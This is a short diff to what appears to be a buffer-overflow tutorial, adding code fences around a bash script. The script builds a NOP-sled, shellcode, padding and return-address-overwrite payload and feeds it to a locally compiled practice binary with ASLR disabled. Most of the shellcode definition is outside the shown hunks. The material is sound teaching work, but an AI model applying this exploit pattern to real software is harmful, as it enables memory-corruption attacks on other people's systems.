@@ -1454,6 +1454,7 @@ returning to, and adjusting, the model above:
 
 Experiment with a bash script:  
 
+```bash
 #!/bin/bash
 
 # This script prepares and executes a buffer overflow command using specific values
@@ -1482,6 +1483,7 @@ RET_OVER='\x88\xe2\xff\xff\xff\x7f\'
 # The resulting string is passed as an argument to the './buffer-overflow' executable.
 # Ensure you have compiled the C code first using "gcc buffer-overflow.c -o buffer-overflow" and disabled security features like ASLR if needed.
 ./buffer-overflow $(python -c "print '\x90'*$NUM_NOPS + '$S_CODE' + '\x90'*$NUM_JUNK + '$RET_OVER'")
+```  
 
 where NUM_NOPS is expected to be 112
 
